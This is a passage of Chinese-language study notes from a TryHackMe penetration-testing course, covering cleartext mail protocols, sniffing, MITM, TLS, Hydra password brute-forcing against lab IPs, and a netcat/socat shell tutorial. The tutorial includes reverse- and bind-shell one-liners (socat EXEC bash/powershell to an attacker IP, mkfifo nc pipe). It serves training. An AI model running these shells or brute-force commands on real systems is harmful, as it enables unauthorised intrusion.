10.10.202.102...</span><br><span class="line">Connected to 10.10.202.102.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">+OK Hello there.</span><br><span class="line">USER frank</span><br><span class="line">+OK Password required.</span><br><span class="line">PASS D2xc9CgD</span><br><span class="line">+OK logged in.</span><br><span class="line">STAT</span><br><span class="line">+OK 1 179</span><br><span class="line">LIST</span><br><span class="line">+OK 1 messages (179) octets</span><br><span class="line">1 179</span><br><span class="line">.</span><br><span class="line">RETR 1</span><br><span class="line">+OK</span><br><span class="line">From: Mail Server </span><br><span class="line">To: Frank </span><br><span class="line">subject: Sending email with Telnet</span><br><span class="line">Hello Frank,</span><br><span class="line">I am just writing to say hi!</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">+OK 10.10.202.102 closing connection</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<h4 id="Task6-IMAP-互联网消息访问协议"><a href="#Task6-IMAP-互联网消息访问协议" class="headerlink" title="Task6 IMAP 互联网消息访问协议"></a>Task6 IMAP 互联网消息访问协议</h4><p>Internet 消息访问协议 (IMAP) 比 POP3 更复杂。 IMAP 可以让您的电子邮件在多个设备（和邮件客户端）之间保持同步。换句话说，如果您在智能手机上检查电子邮件时将电子邮件标记为已读，则更改将保存在 IMAP 服务器 ( MDA ) 上，并在同步收件箱时复制到您的笔记本电脑上。默认端口为143</p>
<p>很明显， IMAP以明文形式发送登录凭据，正如我们在命令<code>LOGIN frank D2xc9CgD</code>中看到的那样。任何观察网络流量的人都能够知道弗兰克的用户名和密码。</p>
<h4 id="Task7-总结"><a href="#Task7-总结" class="headerlink" title="Task7 总结"></a>Task7 总结</h4><table>
<thead>
<tr>
<th>协议</th>
<th>TCP端口</th>
<th>申请</th>
<th>数据安全</th>
</tr>
</thead>
<tbody><tr>
<td>FTP</td>
<td>21</td>
<td>文件传输</td>
<td>明文</td>
</tr>
<tr>
<td>HTTP</td>
<td>80</td>
<td>全球资讯网</td>
<td>明文</td>
</tr>
<tr>
<td>IMAP</td>
<td>143</td>
<td>电子邮件 ( MDA )</td>
<td>明文</td>
</tr>
<tr>
<td>POP3</td>
<td>110</td>
<td>电子邮件 ( MDA )</td>
<td>明文</td>
</tr>
<tr>
<td>SMTP</td>
<td>25</td>
<td>电子邮件 ( MTA )</td>
<td>明文</td>
</tr>
<tr>
<td>远程登录</td>
<td>23</td>
<td>远程访问</td>
<td>明文</td>
</tr>
</tbody></table>
<h3 id="协议和服务2"><a href="#协议和服务2" class="headerlink" title="协议和服务2"></a>协议和服务2</h3><h4 id="Task1-嗅探攻击"><a href="#Task1-嗅探攻击" class="headerlink" title="Task1 嗅探攻击"></a>Task1 嗅探攻击</h4><blockquote>
<p>嗅探攻击是指利用网络抓包工具来收集目标的信息。当协议以明文方式通信时，第三方可以捕获交换的数据进行分析。如果数据在传输过程中未加密，则简单的网络数据包捕获可能会泄露信息，例如私人消息的内容和登录凭据。</p>
</blockquote>
<p>只要用户具有适当的权限（ Linux上的 root 权限和 MS Windows 上的管理员权限），就可以使用以太网 (802.3) 网卡进行嗅探攻击。有许多程序可用于捕获网络数据包。我们考虑以下几点：</p>
<ol>
<li><strong>Tcpdump</strong>是一个免费的开源命令行界面 ( CLI ) 程序，已被移植到许多操作系统上。</li>
<li><strong>Wireshark</strong>是一款免费的开源图形用户界面 (GUI) 程序，适用于多种操作系统，包括Linux 、macOS 和 MS Windows。</li>
<li><strong>Tshark</strong>是 Wireshark 的CLI替代品。</li>
</ol>
<p>数据包捕获需要sudo权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump port 110 -A</span><br></pre></td></tr></table></figure>

<p>注：<code>-A</code>作用是以 ASCII 格式显示捕获的数据包的内容</p>
<h4 id="Task2-中间人-MITM-攻击"><a href="#Task2-中间人-MITM-攻击" class="headerlink" title="Task2 中间人 (MITM) 攻击"></a>Task2 中间人 (MITM) 攻击</h4><p>当受害者 (A) 认为自己正在与合法目的地 (B) 通信，但在不知不觉中与攻击者 (E) 通信时，就会发生中间人 ( MITM ) 攻击。下图中，我们有A请求向M转账20美元；然而，E 更改了该消息并用新值替换了原始值。 B 收到修改后的消息并对其采取行动。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914093552312.png"></p>
<p>MITM还会影响其他明文协议，例如 FTP、SMTP 和 POP3。缓解这种攻击需要使用密码学。解决方案在于正确的身份验证以及交换消息的加密或签名。借助公钥基础设施 (PKI) 和受信任的根证书，传输层安全 (TLS) 可以防止MITM攻击。</p>
<p>可以用来进行中间人攻击的工具，例如<a target="_blank" rel="noopener" href="https://www.ettercap-project.org/">Ettercap</a>和<a target="_blank" rel="noopener" href="https://www.bettercap.org/">Bettercap</a> </p>
<h4 id="Task3-传输层安全-TLS"><a href="#Task3-传输层安全-TLS" class="headerlink" title="Task3 传输层安全 (TLS)"></a>Task3 传输层安全 (TLS)</h4><p>可以防止密码嗅探和MITM攻击，现有的明文协议可以升级为使用 SSL&#x2F;TLS 加密。我们可以使用 TLS 来升级HTTP 、 FTP 、 SMTP 、 POP3 和IMAP等。下表列出了我们涵盖的协议及其通过 SSL&#x2F;TLS 加密升级前后的默认端口。</p>
<table>
<thead>
<tr>
<th>Protocol 协议</th>
<th>Default Port 默认端口</th>
<th>Secured Protocol 安全协议</th>
<th>Default Port with TLS 带 TLS 的默认端口</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP</td>
<td>80</td>
<td>HTTPS</td>
<td>443</td>
</tr>
<tr>
<td>FTP</td>
<td>21</td>
<td>FTPS</td>
<td>990</td>
</tr>
<tr>
<td>SMTP</td>
<td>25</td>
<td>SMTPS</td>
<td>465</td>
</tr>
<tr>
<td>POP3</td>
<td>110</td>
<td>POP3S</td>
<td>995</td>
</tr>
<tr>
<td>IMAP</td>
<td>143</td>
<td>IMAPS</td>
<td>993</td>
</tr>
</tbody></table>
<p>为了使 SSL&#x2F;TLS 有效，尤其是通过 HTTPS 浏览网页时，我们依赖于我们系统信任的证书颁发机构签署的公共证书。换句话说，当我们通过 HTTPS 浏览<a target="_blank" rel="noopener" href="https://tryhackme.com/">TryHackMe</a>时，我们的浏览器期望 TryHackMe Web 服务器提供来自受信任证书颁发机构的签名证书，如下例所示。这样，我们的浏览器就可以确保它与正确的服务器进行通信，并且不会发生MITM攻击。</p>
<h4 id="Task4-安全外壳-SSH"><a href="#Task4-安全外壳-SSH" class="headerlink" title="Task4 安全外壳 (SSH)"></a>Task4 安全外壳 (SSH)</h4><p>我们可以使用SSH来传输文件，在SSH协议的基础上使用SCP（Secure Copy Protocol），示例如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp mark@10.10.224.115:/home/mark/book.txt ~</span><br></pre></td></tr></table></figure>

<p> 该命令将从位于<code>/home/mark</code>目录的远程系统中名为<code>book.txt</code>的文件复制到<code>~</code> ，即当前登录用户的主目录的根目录。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914094842847.png"></p>
<p>也可以将本地文件复制到ssh连接的远程系统上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp backup.tar.bz2 mark@10.10.224.115:/home/mark/</span><br></pre></td></tr></table></figure>

<p>此命令会将文件<code>backup.tar.bz2</code>从本地系统复制到远程系统上的目录<code>/home/mark/</code> </p>
<h4 id="Task5-密码攻击"><a href="#Task5-密码攻击" class="headerlink" title="Task5 密码攻击"></a>Task5 密码攻击</h4><p>Hydra 支持许多协议，包括 FTP、POP3、IMAP、SMTP、SSH 以及所有与HTTP相关的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l username -P wordlist.txt server service</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>-l username</code> ： <code>-l</code>应位于<code>username</code>之前，即目标的登录名。</p>
</li>
<li><p><code>-P wordlist.txt</code> ：-P 位于<code>wordlist.txt</code>文件之前， <code>-P</code>文件是一个文本文件，其中包含您要使用提供的用户名尝试的密码列表。</p>
</li>
<li><p><code>server</code>是目标服务器的主机名或 IP 地址。</p>
</li>
<li><p><code>service</code>表示您尝试发起字典攻击的服务。</p>
</li>
<li><p><code>-s PORT</code>为相关服务指定非默认端口。</p>
</li>
<li><p><code>-V</code>或<code>-vV</code>表示详细信息，使Hydra显示正在尝试的用户名和密码组合。这种冗长的内容非常方便查看进度，特别是如果您对自己的命令行语法仍然没有信心的话。</p>
</li>
<li><p><code>-tn</code>其中 n 是目标的并行连接数。 <code>-t 16</code>将创建 16 个线程用于连接到目标。</p>
</li>
<li><p><code>-d</code> ，用于调试，以获得有关正在发生的情况的更多详细信息。调试输出可以让你省去很多挫败感；例如，如果Hydra尝试连接到一个关闭的端口并超时， <code>-d</code>将立即显示这一点。</p>
</li>
</ul>
<p>假设得到某个电子邮件帐户是<code>lazie</code> ，尝试得到用于访问 10.10.224.115 上的 IMAP 服务的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.224.115 imap</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914095538246.png"></p>
<h3 id="网络安全挑战"><a href="#网络安全挑战" class="headerlink" title="网络安全挑战"></a>网络安全挑战</h3><h4 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.58.189</span><br></pre></td></tr></table></figure>

<p>扫出来小于10000的最大开放端口为8080</p>
<h4 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -p1-20000 -v 10.10.58.189</span><br></pre></td></tr></table></figure>

<p>得到大于10000端口的10021</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914144745279.png"></p>
<h4 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.58.189 -sT -v -p1-20000</span><br></pre></td></tr></table></figure>

<p>打开了6个 TCP 端口</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914144925015.png"></p>
<h4 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h4><p>使用telnet连接靶机的80端口，然后传入以下内容按两下enter发送</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">host: test</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914145249246.png"></p>
<h4 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h4><p>连接ssh的默认端口22</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914145517418.png"></p>
<h4 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h4><p>刚刚扫描有个未知服务的端口10021，连接得到FTP版本信息</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914145924414.png"></p>
<h4 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h4><p>由于不是默认端口，使用<code>-s</code>参数指定端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.10.58.189 ftp -s 10021</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914151555644.png"></p>
<p>得到用户名和密码，不过ftp服务器连上去拿不到flag。爆破另外一个用户名密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.10.58.189 ftp -s 10021</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914152157163.png"></p>
<p>连接ftp，下载拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.58.189 10021</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914152430632.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a>什么是shell</h3><h4 id="Task1-shell类型"><a href="#Task1-shell类型" class="headerlink" title="Task1 shell类型"></a>Task1 shell类型</h4><p>在高层次上，我们对利用目标的两种 shell 感兴趣：反向 shell 和绑定 shell。</p>
<ul>
<li><strong>反向 shell</strong>是指目标被迫执行连接<em>回</em>您的计算机的代码。在您自己的计算机上，您将使用上一个任务中提到的工具之一来设置用于接收连接的<em>侦听器</em>。反向 shell 是绕过防火墙规则的好方法，这些规则可能会阻止您连接到目标上的任意端口；但是，缺点是，当通过互联网从计算机接收 shell  时，您需要配置自己的网络以接受 shell。然而，由于我们连接网络的方法，这在 TryHackMe 网络上不会成为问题。</li>
<li><strong>绑定 shell</strong>是指在目标上执行的代码用于启动附加到直接在目标上的 shell 的侦听器。然后，这将向互联网开放，这意味着您可以连接到代码已打开的端口并以这种方式获得远程代码执行。这样做的优点是不需要在您自己的网络上进行任何配置，但可能会被保护目标的防火墙阻止。</li>
</ul>
<h4 id="Task2-netcat"><a href="#Task2-netcat" class="headerlink" title="Task2 netcat"></a>Task2 netcat</h4><p>如前所述，当涉及任何类型的网络时，Netcat 是渗透测试人员工具包中最基本的工具。有了它，我们可以做各种各样有趣的事情，但现在让我们关注 shell。</p>
<p> <em>反向shell</em></p>
<p>在上一个任务中，我们看到反向 shell 需要 shellcode 和侦听器。执行 shell 的方法有<em>很多种</em>，因此我们将从查看侦听器开始。</p>
<p>使用Linux启动 netcat 侦听器的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port-number&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>-l</strong>用于告诉 netcat 这将是一个侦听器</li>
<li><strong>-v</strong>用于请求详细输出</li>
<li><strong>-n</strong>告诉 netcat 不要解析主机名或使用DNS 。解释这一点超出了房间的范围。</li>
<li><strong>-p</strong>表示将遵循端口规范。</li>
</ul>
<p>上一个任务中的示例使用端口 443。实际上，您可以使用您喜欢的任何端口，只要还没有服务使用它即可。请注意，如果您选择使用低于 1024 的端口，则在启动侦听器时需要使用<code>sudo</code> 。也就是说，使用众所周知的端口号（80、443 或 53 是不错的选择）通常是一个好主意，因为这更有可能通过目标上的出站防火墙规则。</p>
<p>一个可行的例子是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>

<p>然后，我们可以使用任意数量的有效负载连接回此，具体取决于目标上的环境。</p>
<p>上一个任务中显示了这样的示例。</p>
<p> <em>绑定shell</em></p>
<p>如果我们希望在目标上获得绑定 shell，那么我们可以假设目标的选定端口上已经有一个侦听器在等待我们：我们需要做的就是连接到它。其语法相对简单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;target-ip&gt; &lt;chosen-port&gt;</span><br></pre></td></tr></table></figure>

<p>在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。</p>
<p>我们将在任务 8 中了解如何使用 netcat 为此类 shell 创建侦听器。这里重要的是您了解如何使用 netcat 连接到侦听端口。</p>
<h4 id="Task3-netcat-稳定shell"><a href="#Task3-netcat-稳定shell" class="headerlink" title="Task3 netcat 稳定shell"></a>Task3 netcat 稳定shell</h4><p>默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会杀死整个事情。它们是非交互式的，并且经常出现奇怪的格式错误。这是因为 netcat“shell”实际上是在终端<em>内</em>运行的进程，而不是其本身的真正终端。幸运的是，有很多方法可以在 Linux 系统上稳定 netcat shell。我们将在这里关注三个。 Windows 反向 shell 的稳定往往要困难得多；然而，我们将在这里介绍的第二种技术对此特别有用。</p>
<p><strong>方法一</strong></p>
<p>我们将讨论的第一种技术仅适用于Linux机器，因为它们几乎总是默认安装 Python。这是一个三阶段过程：</p>
<ol>
<li>首先要做的是使用 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> ，它使用 Python 生成功能更好的 bash shell；请注意，某些目标可能需要指定的 Python 版本。如果是这种情况，请根据需要将<code>python</code>替换为<code>python2</code>或<code>python3</code> 。此时，我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 自动完成或箭头键，并且 Ctrl + C 仍然会终止 shell。</li>
<li>第二步是： <code>export TERM=xterm</code>这将使我们能够访问术语命令，例如<code>clear</code> 。</li>
<li>最后（也是最重要的）我们将使用 Ctrl + Z 将 shell 置于后台。回到我们自己的终端，我们使用<code>stty raw -echo; fg</code>这做了两件事：首先，它关闭了我们自己的终端回显（这使我们能够访问选项卡自动完成、箭头键和 Ctrl + C 来终止进程）。然后它将 shell 置于前台，从而完成该过程。</li>
</ol>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917165526113.png"></p>
<p>请注意，如果 shell 死机，您自己的终端中的任何输入都将不可见（由于禁用了终端回显）。要解决此问题，请输入<code>reset</code>并按 Enter 键。</p>
<p><strong>方法二</strong></p>
<p>rlwrap 是一个程序，简单来说，它让我们在收到 shell 后立即访问历史记录、制表符自动完成和箭头键<em>；</em>但是，如果您希望能够在 shell 内使用 Ctrl + C，则仍然必须使用<em>一些</em>手动稳定功能。 Kali 上默认没有安装 rlwrap，因此首先使用<code>sudo apt install rlwrap</code>安装它。</p>
<p>要使用 rlwrap，我们调用一个略有不同的侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>在我们的 netcat 监听器前面加上“rlwrap”给我们一个功能更齐全的 shell。这种技术在处理 Windows shell  时特别有用，否则众所周知，Windows shell 很难稳定。在处理 Linux  目标时，可以通过使用与先前技术的第三步中相同的技巧来完全稳定：使用 Ctrl + Z 将 shell 设置为后台，然后使用<code>stty raw -echo; fg</code>稳定并重新进入 shell。</p>
<h4 id="Task4-socat"><a href="#Task4-socat" class="headerlink" title="Task4 socat"></a>Task4 socat</h4><p>Socat 在某些方面与 netcat 相似，但在许多其他方面有根本的不同。考虑 socat 的最简单方法是将其视为两点之间的连接器。为了这个房间的利益，这本质上是一个监听端口和键盘，但是，它也可以是一个监听端口和一个文件，或者实际上是两个监听端口。</p>
<p> <em>反向贝壳</em></p>
<p>如前所述，socat 的语法比 netcat 的语法困难得多。以下是 socat 中基本反向 shell 侦听器的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; -</span><br></pre></td></tr></table></figure>

<p>与 socat 一样，这需要两个点（监听端口和标准输入）并将它们连接在一起。生成的 shell 不稳定，但这可以在Linux或 Windows 上运行，相当于<code>nc -lvnp &lt;port&gt;</code> 。</p>
<p>在 Windows 上，我们将使用此命令来连接回来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</span><br></pre></td></tr></table></figure>

<p>“pipes”选项用于强制powershell（或cmd.exe）使用Unix风格的标准输入和输出。</p>
<p>这是Linux目标的等效命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</span><br></pre></td></tr></table></figure>

<p> <em>绑定外壳</em></p>
<p>在Linux目标上，我们将使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</span><br></pre></td></tr></table></figure>

<p>在 Windows 目标上，我们将使用以下命令作为侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</span><br></pre></td></tr></table></figure>

<p>我们使用“pipes”参数在CLI环境中处理输入和输出的 Unix 和 Windows 方式之间建立接口。</p>
<p>无论目标是什么，我们都会在攻击机器上使用此命令来连接到等待的侦听器。</p>
<p><code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></p>
<p>现在让我们看看 Socat 更强大的用途之一：完全稳定的Linux tty 反向 shell。这仅在目标是Linux时才有效，但<em>明显</em>更稳定。如前所述，socat 是一个非常通用的工具；然而，以下技术可能是其最有用的应用之一。这是新的侦听器语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</span><br></pre></td></tr></table></figure>

<p>让我们将该命令分为两部分。像往常一样，我们将两个点连接在一起。在本例中，这些点是侦听端口和文件。具体来说，我们将当前 TTY 作为文件传递，并将回显设置为零。这大约相当于<strong>使用 Ctrl + Z, <code>stty raw -echo; fg</code>使用 netcat shell 进行<code>stty raw -echo; fg</code>技巧</strong> —— 额外的好处是立即稳定并连接到完整的 tty。</p>
<p>第一个侦听器可以与任何有效负载连接；但是，必须使用非常特定的 socat 命令激活此特殊侦听器。这意味着目标必须安装 socat。大多数机器默认情况下没有安装 socat，但是，可以上传<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">预编译的 socat 二进制文件</a>，然后可以正常执行。</p>
<p>特殊命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>

<p>这是少数，所以让我们把它分解一下。</p>
<p>第一部分很简单——我们正在与在我们自己的机器上运行的侦听器连接。该命令的第二部分使用<code>EXEC:&quot;bash -li&quot;</code>创建交互式 bash 会话。我们还传递参数：pty、stderr、sigint、setsid 和 sane：</p>
<ul>
<li><strong>pty</strong> ，在目标上分配一个伪终端——稳定过程的一部分</li>
<li><strong>stderr</strong> ，确保任何错误消息都显示在 shell 中（通常是非交互式 shell 的问题）</li>
<li><strong>sigint</strong> ，将任何 Ctrl + C 命令传递到子进程中，允许我们终止 shell 内的命令</li>
<li><strong>setid</strong> ，在新会话中创建进程</li>
<li><strong>sane</strong> ，稳定终端，尝试使其“正常化”。</li>
</ul>
<p>需要考虑的内容有很多，所以让我们看看它的实际效果。</p>
<p>与往常一样，左边我们有一个在本地攻击机器上运行的侦听器，右边我们有一个受感染目标的模拟，使用非交互式 shell 运行。使用非交互式 netcat shell，我们执行特殊的 socat 命令，并在左侧的 socat 侦听器上收到完全交互式的  bash shell：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917171620618.png"></p>
<p>请注意，socat shell 是完全交互式的，允许我们使用交互式命令，例如SSH 。然后可以通过设置 stty 值（如上一个任务中所示）来进一步改进，这将使我们可以使用 Vim 或 Nano 等文本编辑器。</p>
<h4 id="Task5-socat-加密shell"><a href="#Task5-socat-加密shell" class="headerlink" title="Task5 socat 加密shell"></a>Task5 socat 加密shell</h4><p>socat 的众多优点之一是它能够创建加密的 shell——绑定和反向。我们为什么要这样做？除非您拥有解密密钥，否则加密的 shell 无法被监视，并且通常能够绕过IDS 。</p>
<p>我们在上一个任务中介绍了如何创建基本 shell，因此这里不再介绍语法。可以说，任何时候<code>TCP</code>用作命令的一部分，在使用加密 shell 时都应该将其替换为<code>OPENSSL</code> 。我们将在任务结束时介绍一些示例，但首先让我们讨论一下证书。</p>
<p>我们首先需要生成一个证书才能使用加密的 shell。这在我们的攻击机器上最容易做到：          </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</span><br></pre></td></tr></table></figure>

<p>此命令创建一个带有匹配证书文件的 2048 位 RSA 密钥，该密钥是自签名的，并且有效期不到一年。当您运行此命令时，它会要求您填写有关证书的信息。这可以留空，也可以随机填写。</p>
<p>然后我们需要将两个创建的文件合并为一个<code>.pem</code>文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shell.key shell.crt &gt; shell.pem</span><br></pre></td></tr></table></figure>

<p>现在，当我们设置反向 shell 侦听器时，我们使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</span><br></pre></td></tr></table></figure>

<p>这将使用我们生成的证书设置一个 OPENSSL 侦听器。 <code>verify=0</code>告诉连接不必尝试验证我们的证书是否已由公认的机构正确签名。请注意，证书<em>必须</em>在正在侦听的任何设备上使用。</p>
<p>要连接回来，我们将使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</span><br></pre></td></tr></table></figure>

<p>同样的技术也适用于绑定 shell：</p>
<p> 目标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</span><br></pre></td></tr></table></figure>

<p> 攻击者：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</span><br></pre></td></tr></table></figure>

<p>再次注意，即使对于 Windows 目标，证书也必须与侦听器一起使用，因此需要复制 PEM 文件以用于绑定 shell。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917172127646.png"></p>
<h4 id="Task6-常见shell-payload"><a href="#Task6-常见shell-payload" class="headerlink" title="Task6 常见shell payload"></a>Task6 常见shell payload</h4><p>之前的任务提到我们将研究一些使用 netcat 作为 Bindshell 侦听器的方法，因此我们将从这里开始。在某些版本的 netcat 中（包括 Kali 附带的<code>nc.exe</code> Windows 版本，位于 <code>/usr/share/windows-resources/binaries</code> ，以及 Kali 本身使用的版本： <code>netcat-traditional</code> ）有一个<code>-e</code>选项，允许您在连接上执行进程。例如，作为听众：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;PORT&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>使用 netcat 连接到上述侦听器将导致目标上有一个绑定 shell。</p>
<p>同样，对于反向 shell，连接回 <code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> 会导致目标受到反向炮弹攻击。</p>
<p>然而，大多数版本的 netcat 中均未包含此功能，因为人们普遍认为它非常不安全（这很有趣，不是吗？）。在几乎总是需要静态二进制文件的 Windows 上，这种技术将完美地发挥作用。然而，在Linux上，我们将使用以下代码为绑定 shell 创建侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br></pre></td></tr></table></figure>

<blockquote>
<p><em>该命令首先在<code>/tmp/f</code>处创建一个<a target="_blank" rel="noopener" href="https://www.linuxjournal.com/article/2156">命名管道</a>。然后它启动一个 netcat 侦听器，并将侦听器的输入连接到命名管道的输出。然后，netcat 侦听器的输出（即我们发送的命令）直接通过管道传输到<code>sh</code>中，将 stderr 输出流发送到 stdout 中，并将 stdout 本身发送到命名管道的输入中，从而完成循环。</em></p>
</blockquote>
